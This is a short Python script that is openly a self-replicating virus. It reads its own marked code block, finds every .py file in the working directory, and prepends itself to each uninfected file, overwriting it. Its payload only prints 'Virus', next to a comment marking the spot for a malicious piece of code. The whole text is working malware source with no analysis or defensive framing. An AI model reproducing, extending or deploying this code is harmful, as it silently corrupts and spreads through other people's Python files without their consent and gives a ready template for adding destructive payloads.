###Start#####
import sys, glob
code = []

with open(sys.argv[0],'r') as f:
    lines = f.readlines()

virus_area = False

for line in lines:
    if "###Start#####" in line:
        virus_area = True
    if virus_area:
        code.append(line)
    if "###End#####" in line and "if" not in line:
        break

scrips = glob.glob('*.py')

for scrip in scrips:
    with open(scrip, 'r') as f:
        scrip_code = f.readlines()
    infected = False
    for line_scr in scrip_code:
        if "###Start#####" in line_scr:
            infected = True
            break
    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend("\n")
        final_code.extend(scrip_code)

        with open(scrip,'w') as f:
            f.writelines(final_code)


# Malicious peice of code
print("\nVirus")

###End#####
print("\nProgram")